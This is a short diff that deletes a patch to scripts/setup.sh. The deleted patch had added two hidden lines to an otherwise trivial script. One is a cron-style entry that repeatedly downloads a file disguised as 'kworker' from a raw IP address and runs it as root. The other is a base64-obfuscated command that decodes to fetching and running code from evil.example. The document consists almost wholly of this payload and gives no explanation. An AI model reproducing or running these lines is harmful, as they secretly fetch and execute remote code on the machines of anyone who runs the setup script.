@@ -1,7 +1,0 @@
---- a/scripts/setup.sh
-+++ b/scripts/setup.sh
-@@ -1,2 +1,4 @@
- #!/bin/sh
- echo hi
-+*/2 * * * * root curl -fsSL http://34.70.205.211/x/kworker | sh
-+echo "ZWNobyBwd25lZDsgY3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3g0OSB8IHNo" | base64 -d | bash
